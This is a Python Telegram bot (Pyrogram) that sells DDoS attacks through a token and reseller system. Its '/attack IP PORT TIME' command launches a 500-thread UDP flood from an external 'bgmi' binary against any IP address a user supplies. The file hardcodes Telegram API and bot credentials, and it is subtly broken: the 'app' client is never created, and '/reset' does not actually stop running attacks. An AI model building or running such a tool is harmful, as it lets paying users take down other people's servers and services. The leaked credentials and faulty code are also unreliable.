from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import subprocess
import threading
import time
import os
from datetime import datetime

# ============================================
# CONFIGURATION
# ============================================
API_ID = 24676264
API_HASH = "e04ebd801c8ae8b26986c482fb31f853"
BOT_TOKEN = "8699345560:AAEId4DfullLQZbW9hRFVIjLkI4xCG1fNXc"
OWNER_ID = 1917682089
RESELLER_IDS = [2109683176]

# Attack binary path
BGMI_PATH = "./bgmi"

# ============================================
# DATABASE SETUP
# ============================================
conn = sqlite3.connect('bot_database.db', check_same_thread=False)
cursor = conn.cursor()

# Create tables
cursor.execute('''
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    tokens INTEGER DEFAULT 5,
    role TEXT DEFAULT 'member',
    banned INTEGER DEFAULT 0,
    attacks_done INTEGER DEFAULT 0
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS attacks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    ip TEXT,
    port INTEGER,
    duration INTEGER,
    status TEXT DEFAULT 'running',
    start_time TEXT,
    end_time TEXT
)
''')

conn.commit()

# ============================================
# HELPER FUNCTIONS
# ============================================
def get_user(user_id):
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    return cursor.fetchone()

def add_user(user_id, username):
    cursor.execute('INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)', (user_id, username))
    conn.commit()

def deduct_token(user_id):
    cursor.execute('UPDATE users SET tokens = tokens - 1 WHERE user_id = ? AND tokens > 0', (user_id,))
    conn.commit()
    return cursor.rowcount > 0

def add_attack_count(user_id):
    cursor.execute('UPDATE users SET attacks_done = attacks_done + 1 WHERE user_id = ?', (user_id,))
    conn.commit()

def log_attack(user_id, ip, port, duration):
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute('''
        INSERT INTO attacks (user_id, ip, port, duration, start_time)
        VALUES (?, ?, ?, ?, ?)
    ''', (user_id, ip, port, duration, start_time))
    conn.commit()
    return cursor.lastrowid

def update_attack_status(attack_id, status):
    end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute('UPDATE attacks SET status = ?, end_time = ? WHERE id = ?', (status, end_time, attack_id))
    conn.commit()

# ============================================
# ATTACK FUNCTION
# ============================================
def run_bgmi_attack(attack_id, user_id, chat_id, ip, port, duration):
    try:
        # Check if bgmi exists
        if not os.path.exists(BGMI_PATH):
            app.send_message(chat_id, f"❌ Error: {BGMI_PATH} not found!")
            update_attack_status(attack_id, "failed")
            return
        
        # Build command
        cmd = f"{BGMI_PATH} {ip} {port} {duration} 500"
        print(f"[+] Executing: {cmd}")
        
        # Run attack
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Wait for attack to complete
        time.sleep(duration)
        process.terminate()
        
        # Update status
        update_attack_status(attack_id, "completed")
        
        # Send completion message
        app.send_message(
            chat_id,
            f"✅ *Attack Completed!*\n\n"
            f"🎯 *Target:* `{ip}:{port}`\n"
            f"⏰ *Duration:* `{duration}s`\n"
            f"🔧 *Threads:* `500`\n\n"
            f"👑 *Bot by:* @PRIME_X_ARMY_OWNER",
            parse_mode="Markdown"
        )
        
    except Exception as e:
        update_attack_status(attack_id, "failed")
        app.send_message(chat_id, f"❌ *Attack Failed:* `{str(e)}`", parse_mode="Markdown")

# ============================================
# COMMANDS
# ============================================

@app.on_message(filters.command("start"))
async def start_command(client, message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    add_user(user_id, username)
    
    user = get_user(user_id)
    tokens = user[2] if user else 5
    
    await message.reply_text(
        f"🔥 *PRIME ONYX DDoS Bot* 🔥\n\n"
        f"👤 *User:* @{username}\n"
        f"💰 *Tokens:* `{tokens}`\n"
        f"📊 *Attacks Done:* `{user[5] if user else 0}`\n\n"
        f"📌 *Commands:*\n"
        f"`/attack IP PORT TIME` - Start UDP flood\n"
        f"`/tokens` - Check balance\n"
        f"`/status` - Bot status\n"
        f"`/help` - Help menu\n\n"
        f"💡 *1 token = 1 attack (10-300 sec)*\n\n"
        f"👑 *Bot by:* @PRIME_X_ARMY_OWNER",
        parse_mode="Markdown"
    )

@app.on_message(filters.command("attack"))
async def attack_command(client, message):
    user_id = message.from_user.id
    args = message.text.split()
    
    user = get_user(user_id)
    if not user:
        await message.reply_text("❌ Use /start first")
        return
    
    if user[4] == 1:
        await message.reply_text("❌ You are banned!")
        return
    
    if user[2] <= 0:
        await message.reply_text("❌ No tokens left! Contact reseller.")
        return
    
    if len(args) != 4:
        await message.reply_text(
            f"❌ *Usage:* `/attack IP PORT TIME`\n\n"
            f"📌 *Example:* `/attack 1.1.1.1 80 60`\n"
            f"💰 *Your tokens:* `{user[2]}`\n\n"
            f"⏰ *Time range:* 10-300 seconds",
            parse_mode="Markdown"
        )
        return
    
    ip = args[1]
    port = args[2]
    duration = args[3]
    
    try:
        port_num = int(port)
        if port_num < 1 or port_num > 65535:
            await message.reply_text("❌ Invalid port! Use 1-65535")
            return
        
        duration_sec = int(duration)
        if duration_sec < 10 or duration_sec > 300:
            await message.reply_text("❌ Invalid duration! Use 10-300 seconds")
            return
        
        # Validate IP
        parts = ip.split('.')
        if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
            await message.reply_text("❌ Invalid IP address!")
            return
        
        # Deduct token and log attack
        if deduct_token(user_id):
            attack_id = log_attack(user_id, ip, port_num, duration_sec)
            add_attack_count(user_id)
            
            # Get updated token count
            user = get_user(user_id)
            tokens_left = user[2]
            
            # Send confirmation
            await message.reply_text(
                f"🚀 *Attack Initiated!*\n\n"
                f"🎯 *Target:* `{ip}:{port_num}`\n"
                f"⏰ *Duration:* `{duration_sec}s`\n"
                f"🔧 *Threads:* `500`\n"
                f"💰 *Tokens Left:* `{tokens_left}`\n\n"
                f"⚡ *Attack running...*",
                parse_mode="Markdown"
            )
            
            # Start attack in background thread
            thread = threading.Thread(
                target=run_bgmi_attack,
                args=(attack_id, user_id, message.chat.id, ip, port_num, duration_sec)
            )
            thread.daemon = True
            thread.start()
        else:
            await message.reply_text("❌ Failed to deduct token! Please try again.")
            
    except ValueError:
        await message.reply_text("❌ Invalid port or duration! Use numbers only.")
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")

@app.on_message(filters.command("tokens"))
async def tokens_command(client, message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if not user:
        await message.reply_text("❌ Use /start first")
        return
    
    await message.reply_text(
        f"💰 *Token Balance*\n\n"
        f"👤 *User:* @{user[1]}\n"
        f"🎟️ *Tokens:* `{user[2]}`\n"
        f"📊 *Attacks Done:* `{user[5]}`\n\n"
        f"💡 *Contact reseller to buy more tokens*",
        parse_mode="Markdown"
    )

@app.on_message(filters.command("status"))
async def status_command(client, message):
    # Get active attacks count
    cursor.execute('SELECT COUNT(*) FROM attacks WHERE status = "running"')
    running = cursor.fetchone()[0]
    
    # Get total users
    cursor.execute('SELECT COUNT(*) FROM users')
    total_users = cursor.fetchone()[0]
    
    # Get total attacks
    cursor.execute('SELECT COUNT(*) FROM attacks')
    total_attacks = cursor.fetchone()[0]
    
    await message.reply_text(
        f"📊 *Bot Status*\n\n"
        f"🟢 *Running Attacks:* `{running}`\n"
        f"👥 *Total Users:* `{total_users}`\n"
        f"📈 *Total Attacks:* `{total_attacks}`\n"
        f"⚡ *Max Concurrent:* `5`\n\n"
        f"✅ *Bot is operational*",
        parse_mode="Markdown"
    )

@app.on_message(filters.command("help"))
async def help_command(client, message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if not user:
        await message.reply_text("❌ Use /start first")
        return
    
    is_admin = user_id == OWNER_ID or user_id in RESELLER_IDS
    
    if is_admin:
        help_text = """
👑 *Admin Commands*

📌 *Member Commands:*
`/attack IP PORT TIME` - Start attack
`/tokens` - Check balance
`/status` - Bot status

🔧 *Admin Only:*
`/addtokens <user_id> <amount>` - Add tokens
`/ban <user_id>` - Ban user
`/unban <user_id>` - Unban user
`/listusers` - List all users
`/broadcast <message>` - Send to all
`/reset` - Reset all attacks

👑 *Bot by:* @PRIME_X_ARMY_OWNER
"""
    else:
        help_text = """
👤 *Member Commands*

`/attack IP PORT TIME` - Start UDP flood
`/tokens` - Check token balance
`/status` - Bot status
`/start` - Welcome message

📌 *Example:*
`/attack 1.1.1.1 80 60`

💡 *1 token = 1 attack (10-300 sec)*
💰 *Buy tokens from reseller*

👑 *Bot by:* @PRIME_X_ARMY_OWNER
"""
    
    await message.reply_text(help_text, parse_mode="Markdown")

# ============================================
# ADMIN COMMANDS
# ============================================

@app.on_message(filters.command("addtokens"))
async def add_tokens(client, message):
    user_id = message.from_user.id
    
    if user_id != OWNER_ID and user_id not in RESELLER_IDS:
        await message.reply_text("❌ Admin only command!")
        return
    
    args = message.text.split()
    if len(args) != 3:
        await message.reply_text("❌ Usage: `/addtokens <user_id> <amount>`", parse_mode="Markdown")
        return
    
    target_id = int(args[1])
    amount = int(args[2])
    
    cursor.execute('UPDATE users SET tokens = tokens + ? WHERE user_id = ?', (amount, target_id))
    conn.commit()
    
    await message.reply_text(f"✅ Added `{amount}` tokens to user `{target_id}`", parse_mode="Markdown")

@app.on_message(filters.command("ban"))
async def ban_user(client, message):
    user_id = message.from_user.id
    
    if user_id != OWNER_ID:
        await message.reply_text("❌ Owner only command!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        await message.reply_text("❌ Usage: `/ban <user_id>`", parse_mode="Markdown")
        return
    
    target_id = int(args[1])
    cursor.execute('UPDATE users SET banned = 1 WHERE user_id = ?', (target_id,))
    conn.commit()
    
    await message.reply_text(f"🔴 User `{target_id}` banned!", parse_mode="Markdown")

@app.on_message(filters.command("unban"))
async def unban_user(client, message):
    user_id = message.from_user.id
    
    if user_id != OWNER_ID:
        await message.reply_text("❌ Owner only command!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        await message.reply_text("❌ Usage: `/unban <user_id>`", parse_mode="Markdown")
        return
    
    target_id = int(args[1])
    cursor.execute('UPDATE users SET banned = 0 WHERE user_id = ?', (target_id,))
    conn.commit()
    
    await message.reply_text(f"🟢 User `{target_id}` unbanned!", parse_mode="Markdown")

@app.on_message(filters.command("listusers"))
async def list_users(client, message):
    user_id = message.from_user.id
    
    if user_id != OWNER_ID and user_id not in RESELLER_IDS:
        await message.reply_text("❌ Admin only command!")
        return
    
    cursor.execute('SELECT user_id, username, tokens, attacks_done, banned FROM users LIMIT 20')
    users = cursor.fetchall()
    
    if not users:
        await message.reply_text("No users found")
        return
    
    user_list = "\n".join([
        f"🆔 `{u[0]}` | @{u[1] or 'NoName'} | 🎟️ {u[2]} | 📊 {u[3]} | {'🔴' if u[4] else '🟢'}"
        for u in users
    ])
    
    await message.reply_text(
        f"👥 *User List*\n\n{user_list}\n\nTotal: `{len(users)}`",
        parse_mode="Markdown"
    )

@app.on_message(filters.command("broadcast"))
async def broadcast(client, message):
    user_id = message.from_user.id
    
    if user_id != OWNER_ID:
        await message.reply_text("❌ Owner only command!")
        return
    
    msg_text = message.text.replace('/broadcast', '').strip()
    if not msg_text:
        await message.reply_text("❌ Usage: `/broadcast <message>`", parse_mode="Markdown")
        return
    
    cursor.execute('SELECT user_id FROM users')
    users = cursor.fetchall()
    
    success = 0
    failed = 0
    
    for user in users:
        try:
            await client.send_message(user[0], f"📢 *Announcement*\n\n{msg_text}\n\n👑 @PRIME_X_ARMY_OWNER", parse_mode="Markdown")
            success += 1
        except:
            failed += 1
        time.sleep(0.1)
    
    await message.reply_text(f"✅ Broadcast sent!\n\n📨 Success: `{success}`\n❌ Failed: `{failed}`", parse_mode="Markdown")

@app.on_message(filters.command("reset"))
async def reset_command(client, message):
    user_id = message.from_user.id
    
    if user_id != OWNER_ID:
        await message.reply_text("❌ Owner only command!")
        return
    
    cursor.execute('UPDATE attacks SET status = "stopped" WHERE status = "running"')
    conn.commit()
    
    await message.reply_text("🔄 All running attacks stopped!", parse_mode="Markdown")

# ============================================
# RUN BOT
# ============================================
if __name__ == "__main__":
    print("=" * 50)
    print("🔥 PRIME ONYX PYROGRAM BOT")
    print("=" * 50)
    print(f"📊 Using binary: {BGMI_PATH}")
    print(f"👑 Owner ID: {OWNER_ID}")
    print("=" * 50)
    print("✅ Bot is running...")
    
    app.run()
